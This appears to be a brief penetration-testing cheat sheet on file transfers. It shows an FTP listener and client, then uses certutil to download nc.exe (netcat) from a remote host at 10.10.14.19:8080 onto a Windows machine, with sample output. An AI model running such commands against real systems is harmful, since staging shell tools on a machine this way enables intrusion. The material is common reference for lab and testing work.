# File Transfers

# File Transfer Protocol
FTP listener
```
python -m pyftpdlib 21
```
FTP client
```
ftp 10.0.2.12
```


## certutil
Example:
```
certutil -urlcache -f http://10.10.14.19:8080/nc.exe nc.exe
```
Example output:
```
C:\temp> certutil -urlcache -f http://10.10.14.19:8080/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\temp> dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\temp

01/26/2025  05:30 PM    <DIR>          .
01/26/2025  05:30 PM    <DIR>          ..
01/26/2025  05:30 PM            28,160 nc.exe
               1 File(s)         28,160 bytes
               2 Dir(s)  13,890,064,384 bytes free

C:\temp> 
```
